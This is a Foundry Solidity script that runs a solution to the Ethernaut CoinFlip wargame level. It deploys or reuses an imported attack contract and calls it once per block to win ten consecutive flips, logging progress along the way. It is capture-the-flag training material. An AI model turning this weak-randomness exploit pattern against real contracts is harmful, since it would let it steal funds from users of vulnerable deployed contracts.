// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {ICoinFlip} from "../src/interfaces/ICoinFlip.sol";
import {CoinFlipAttack} from "../src/attackers/CoinFlipAttack.sol";

contract CoinFlipScript is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address instance = vm.envAddress("INSTANCE_ADDRESS");
        address attackContractAddress = vm.envOr("COINFLIP_ATTACK_ADDRESS", address(0));

        ICoinFlip target = ICoinFlip(instance);

        console2.log("--- CoinFlip Exploit ---");
        console2.log("Target Instance:", instance);
        console2.log("Current Consecutive Wins:", target.consecutiveWins());

        vm.startBroadcast(privateKey);

        CoinFlipAttack attacker;

        if (attackContractAddress == address(0)) {
            console2.log("Deploying new CoinFlipAttack contract...");
            attacker = new CoinFlipAttack(instance);
            console2.log("Deployed CoinFlipAttack at:", address(attacker));
            console2.log("Note: Add COINFLIP_ATTACK_ADDRESS to your .env to reuse it for subsequent flips.");
        } else {
            attacker = CoinFlipAttack(attackContractAddress);
            console2.log("Using existing CoinFlipAttack at:", address(attacker));
        }

        // Execute one attack flip in this block
        attacker.attack();

        vm.stopBroadcast();

        uint256 newWins = target.consecutiveWins();
        console2.log("Updated Consecutive Wins:", newWins, "/ 10");

        if (newWins >= 10) {
            console2.log(">>> SUCCESS! 10 consecutive wins achieved! Submit instance in Ethernaut. <<<");
        }
    }
}
